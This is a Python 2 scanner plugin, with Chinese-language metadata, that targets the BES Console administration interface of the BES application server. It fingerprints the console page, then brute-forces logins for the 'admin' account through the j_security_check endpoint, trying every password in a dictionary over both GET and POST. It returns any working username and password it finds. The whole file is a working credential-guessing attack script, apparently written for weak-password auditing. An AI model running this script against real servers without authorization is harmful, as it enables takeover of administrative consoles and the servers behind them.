# coding:utf-8
import requests


def get_plugin_info():
    plugin_info = {
        "name": "BES Console弱口令",
        "info": "攻击者通过此漏洞可以登陆管理控制台，可能导致直接获取服务器权限。",
        "level": "高危",
        "type": "弱口令",
        "author": "liil",
        "url": "",
        "keyword": "title:BES Console",
        "source": 1
    }
    return plugin_info


def check(host, port, timeout):
    url = "http://%s:%d" % (host, int(port))
    error_i = 0
    flag_list = ['logo_left.jpg']
    user_list = ['admin']
    try:
        res_1 = requests.get(url + '/console/home',
                             timeout=timeout, allow_redirects=False)
        res = requests.get(url + '/', timeout=timeout, allow_redirects=False)
        if 'BES Console --' in res_1.text:
            r = requests.Session()
            for user in user_list:
                for password in PASSWORD_DIC:
                    try:
                        request = r.get(
                            url + '/console/j_security_check?j_username=%s&j_password=%s' % (user, password), timeout=timeout)
                        res_html = request.text
                    except Exception, e:
                        error_i += 1
                        if error_i >= 3:
                            return
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            info = u'%s/console/home 账号：%s，密码：%s' % (
                                url, user, password)
                            return info
        if 'BES Console --' in res.text:
            r1 = requests.Session()
            for user in user_list:
                for password in PASSWORD_DIC:
                    try:
                        payload = {'j_username': '%s' % user,
                                   'j_password': '%s' % password}
                        request = r1.post(
                            url + '/j_security_check', data=payload, timeout=timeout)
                        res_html = request.text
                    except Exception, e:
                        error_i += 1
                        if error_i >= 3:
                            return
                        continue
                    for flag in flag_list:
                        if flag in res_html:
                            info = u'%s/ 账号：%s，密码：%s' % (url, user, password)
                            return info
    except Exception, e:
        pass
